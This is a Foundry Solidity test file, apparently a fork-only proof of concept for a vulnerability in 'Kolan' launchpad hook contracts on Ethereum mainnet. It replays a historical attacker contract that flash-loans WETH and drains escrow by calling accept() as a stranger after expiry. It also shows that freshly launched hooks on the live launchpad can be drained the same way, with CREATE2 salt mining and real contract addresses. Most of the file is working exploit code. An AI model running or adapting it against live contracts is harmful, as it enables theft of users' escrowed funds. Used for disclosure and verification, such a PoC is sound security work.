// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";

interface IHook {
    function windowCount() external view returns (uint256);
    function held() external view returns (uint128, uint128);
    function windows(uint256) external view returns (address, uint40, uint8, uint96, uint96, uint64);
    function accept(uint256) external;
    function cancel(uint256) external;
    function buy(address, uint256, uint256, uint256) external payable returns (uint256, uint256);
    function launched() external view returns (bool);
    function TOKEN() external view returns (address);
    function REFERENCE_PREMIUM() external view returns (uint256);
    function BASE_WINDOW() external view returns (uint256);
    function MIN_WINDOW() external view returns (uint256);
    function MAX_WINDOW() external view returns (uint256);
    function MAX_PREMIUM_BPS() external view returns (uint256);
    function TAX_BPS() external view returns (uint256);
}

interface ILaunchpad {
    function launchCount() external view returns (uint256);
    function hooksBetween(uint256, uint256) external view returns (address[] memory);
    function hookAt(uint256) external view returns (address);
    function initCodeHash(string calldata, string calldata, address) external view returns (bytes32);
    function launch(string calldata, string calldata, string calldata, uint256, bytes32)
        external
        payable
        returns (address, address, uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

/// @title Kolan LaunchHook re-arm PoC (fork-only, no transactions broadcast)
/// @notice Proves: (1) the historical KolanHook drain reproduces verbatim;
/// (2) `accept(id)` is callable by any stranger once `block.timestamp >= expiry`;
/// (3) a launchpad LaunchHook that has escrowed ETH re-arms identically;
/// (4) the live Launchpad's LaunchHook bytecode re-arms when a fresh window is funded.
contract KolanTest is Test {
    address constant LAUNCHPAD = 0x8F89905624E3613b3A578Ff1EC690463A33e940e;
    address constant MAIN = 0x0136feCf49E0217BFd2D9551E8e7b05f174Ba8eC;
    address constant HOOK0 = 0xC75059B9e101483cA3261CA3FDd65bf85a1528EC;
    address constant HOOK0_OWNER = 0x46ad135AF891a56881107cA00A3B22882D7ec60b;

    uint256 constant BLK_EXPLOIT = 26_197_503; // parent block of the 2026-10-15 exploit tx
    uint256 constant BLK_HOOK0_BUY = 26_167_732; // 1 block after hook[0] WindowOpened(1)

    // keyless, archive-capable Ethereum RPCs (no API key -> safe to print in logs)
    string[] internal ARCHIVE = [
        "https://eth.drpc.org",
        "https://eth-mainnet.public.blastapi.io",
        "https://rpc.mevblocker.io",
        "https://1rpc.io/eth",
        "https://eth-pokt.nodies.app"
    ];

    receive() external payable {}

    // ---- fork helpers -------------------------------------------------------

    function _forkAt(string memory url, uint256 blk) external {
        vm.createSelectFork(url, blk);
    }

    /// Try each keyless archive RPC until one serves *state* at `blk`.
    function _selectArchiveFork(uint256 blk) internal {
        for (uint256 i = 0; i < ARCHIVE.length; ++i) {
            try this._forkAt(ARCHIVE[i], blk) {
                (bool ok, bytes memory d) = MAIN.staticcall(abi.encodeWithSelector(bytes4(0x2d07ae11)));
                if (ok && d.length >= 32) return;
            } catch {}
        }
        revert("no archive RPC served the requested block");
    }

    function _forkHead() internal {
        vm.createSelectFork(
            vm.envOr("FORK_RPC_URL", string("https://ethereum-rpc.publicnode.com"))
        );
    }

    /// Deploy the exact historical attacker creation code (constructor runs the exploit).
    function _deployAttacker() internal returns (address a) {
        bytes memory code = vm.parseBytes(vm.readFile("exploit_attacker.hex"));
        assembly {
            a := create(0, add(code, 0x20), mload(code))
        }
        require(a != address(0), "attacker deploy failed");
    }

    /// Mine a CREATE2 salt whose resulting LaunchHook address carries the hook flag bits (0x28EC).
    function _mineSalt(address creator, string memory name, string memory symbol) internal view returns (bytes32) {
        bytes32 initHash = ILaunchpad(LAUNCHPAD).initCodeHash(name, symbol, creator);
        for (uint256 i = 0; i < 3_000_000; ++i) {
            bytes32 salt = bytes32(i);
            address a = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), LAUNCHPAD, salt, initHash)))));
            if ((uint160(a) & uint160(0x3FFF)) == uint160(0x28EC)) return salt;
        }
        revert("no salt found");
    }

    // ---- tests --------------------------------------------------------------

    /// (a) Reproduce the ORIGINAL KolanHook drain verbatim at block 26_197_503.
    /// The attacker contract deploys, flash-loans WETH from Balancer, calls
    /// KolanHook.accept(10) + accept(42) as a stranger, unwinds, repays and
    /// sends the net profit to its `beneficiary` (= this test contract).
    function test_01_originalKolanHook_drain_reproduces() public {
        _selectArchiveFork(BLK_EXPLOIT);
        (uint128 heldBefore,) = IHook(MAIN).held();
        assertGt(heldBefore, 0, "no escrow at fork block");

        uint256 balBefore = address(this).balance;
        _deployAttacker();
        uint256 profit = address(this).balance - balBefore;

        emit log_named_uint("main held.eth before (wei)", heldBefore);
        emit log_named_uint("attacker net profit (wei)", profit);
        emit log_named_decimal_uint("attacker net profit (ETH)", profit, 18);
        (uint128 heldAfter,) = IHook(MAIN).held();
        emit log_named_uint("main held.eth after (wei)", heldAfter);
        assertGt(profit, 0, "exploit did not reproduce");
    }

    /// (b) A stranger (not the window owner) can call accept(id) once expired.
    function test_02_mainHook_accept_is_permissionless_after_expiry() public {
        _selectArchiveFork(BLK_EXPLOIT);
        (address owner,,, uint96 eth,, uint64 premium) = _win(MAIN, 10);
        (, uint40 expiry,,) = _winMeta(MAIN, 10);
        assertTrue(owner != address(0));
        assertTrue(block.timestamp >= expiry, "window not yet expired");
        assertGt(eth, 0);

        (uint128 heldBefore,) = IHook(MAIN).held();
        address stranger = address(0xBEEF);
        vm.prank(stranger);
        IHook(MAIN).accept(10); // <-- stranger, ungated after expiry
        (uint128 heldAfter,) = IHook(MAIN).held();

        emit log_named_uint("window10 eth (wei)", eth);
        emit log_named_uint("window10 premium (wei)", premium);
        emit log_named_uint("held.eth before (wei)", heldBefore);
        emit log_named_uint("held.eth after (wei)", heldAfter);
        assertLt(heldAfter, heldBefore, "escrow not consumed");
        (address ownerAfter,,,,,) = IHook(MAIN).windows(10);
        assertEq(ownerAfter, address(0), "window not closed");
    }

    /// (c) launchpad hook[0]: it held 0.029631 ETH escrow after its first buy();
    /// a stranger can call accept(1) after expiry and force the spot buy-back.
    function test_03_launchHook0_stranger_accept_drains() public {
        _selectArchiveFork(BLK_HOOK0_BUY);
        (address owner,,, uint96 eth, uint96 tokens, uint64 premium) = _win(HOOK0, 1);
        (, uint40 expiry,,) = _winMeta(HOOK0, 1);
        assertEq(owner, HOOK0_OWNER, "unexpected owner");
        assertGt(eth, 0, "window not funded");
        assertTrue(block.timestamp < expiry, "expected window still open at fork");

        (uint128 heldBefore,) = IHook(HOOK0).held();
        assertGt(heldBefore, 0, "hook had no escrow");

        vm.warp(uint256(expiry) + 1); // walk past expiry on the fork
        address stranger = address(0xBEEF);
        vm.prank(stranger);
        IHook(HOOK0).accept(1); // <-- stranger forces the close + buy-back
        (uint128 heldAfter,) = IHook(HOOK0).held();

        address token = IHook(HOOK0).TOKEN();
        emit log_named_uint("window1 eth (wei)", eth);
        emit log_named_uint("window1 premium (wei)", premium);
        emit log_named_uint("held.eth before (wei)", heldBefore);
        emit log_named_uint("held.eth after (wei)", heldAfter);
        emit log_named_uint("owner TOKEN received", IERC20(token).balanceOf(owner));
        assertLt(heldAfter, heldBefore, "escrow not consumed by stranger accept");
        assertEq(IERC20(token).balanceOf(owner), tokens, "owner did not receive window tokens");
        (address ownerAfter,,,,,) = IHook(HOOK0).windows(1);
        assertEq(ownerAfter, address(0), "window not closed");
    }

    /// (d) The LIVE Launchpad still deploys re-armable LaunchHooks: launch a fresh
    /// token (permissionless), fund a window via buy(), warp past expiry, and a
    /// stranger's accept() consumes the escrow.
    function test_04_liveLaunchpad_freshHook_rearms_and_drains() public {
        _forkHead();
        uint256 n = ILaunchpad(LAUNCHPAD).launchCount();

        string memory nm = "ZH4POC";
        string memory sy = "Z4";
        bytes32 salt = _mineSalt(address(this), nm, sy);
        (address token, address hook,) = ILaunchpad(LAUNCHPAD).launch{value: 0.05 ether}(
            nm, sy, "", 0.01 ether, salt
        );
        assertTrue(hook != address(0));

        // premium identical to the one that worked for hook[0] on the same launchpad config
        uint256 premium = 0.006831018518518519 ether;
        uint256 wcBefore = IHook(hook).windowCount();
        IHook(hook).buy{value: premium + 1000 + 0.1 ether}(address(this), premium, 0, block.timestamp + 3600);
        assertEq(IHook(hook).windowCount(), wcBefore + 1, "window not opened");

        (uint128 heldBefore,) = IHook(hook).held();
        assertGt(heldBefore, 0, "no escrow");
        (address owner,,, uint96 eth,,) = _win(hook, 1);
        (, uint40 expiry,,) = _winMeta(hook, 1);
        assertEq(owner, address(this));

        vm.warp(uint256(expiry) + 1);
        address stranger = address(0xBEEF);
        vm.prank(stranger);
        IHook(hook).accept(1);
        (uint128 heldAfter,) = IHook(hook).held();

        emit log_named_address("fresh hook", hook);
        emit log_named_address("fresh token", token);
        emit log_named_uint("window1 eth (wei)", eth);
        emit log_named_uint("held.eth before (wei)", heldBefore);
        emit log_named_uint("held.eth after (wei)", heldAfter);
        assertLt(heldAfter, heldBefore, "escrow not consumed");
        assertEq(ILaunchpad(LAUNCHPAD).launchCount(), n + 1);
    }

    /// (e) Current live state: every launch hook + the main hook holds $0 escrow.
    function test_05_currentState_all_empty() public {
        _forkHead();
        uint256 n = ILaunchpad(LAUNCHPAD).launchCount();
        address[] memory hs = ILaunchpad(LAUNCHPAD).hooksBetween(0, n);
        uint256 total;
        for (uint256 i = 0; i < hs.length; ++i) {
            (uint128 e,) = IHook(hs[i]).held();
            total += e;
            assertEq(e, 0, "hook has escrow");
            assertEq(hs[i].balance, 0, "hook has balance");
        }
        (uint128 me,) = IHook(MAIN).held();
        emit log_named_uint("sum launch hook held.eth (wei)", total);
        emit log_named_uint("main held.eth (wei)", me);
        assertEq(total, 0);
        assertEq(me, 0);
        assertEq(MAIN.balance, 0);
    }

    /// (f) Negative: with all windows closed, accept() reverts NoWindow today.
    function test_06_currentState_accept_reverts_NoWindow() public {
        _forkHead();
        vm.expectRevert(); // KolanHook.NoWindow()
        IHook(HOOK0).accept(1);
    }

    // ---- decode helpers -----------------------------------------------------

    function _win(address h, uint256 id)
        internal
        view
        returns (address owner, uint40 expiry, uint8 cuts, uint96 eth, uint96 tokens, uint64 premium)
    {
        return IHook(h).windows(id);
    }

    function _winMeta(address h, uint256 id) internal view returns (uint256 a, uint40 expiry, uint256 c, uint256 d) {
        (address owner, uint40 e,,,,) = IHook(h).windows(id);
        return (uint256(uint160(owner)), e, 0, 0);
    }
}
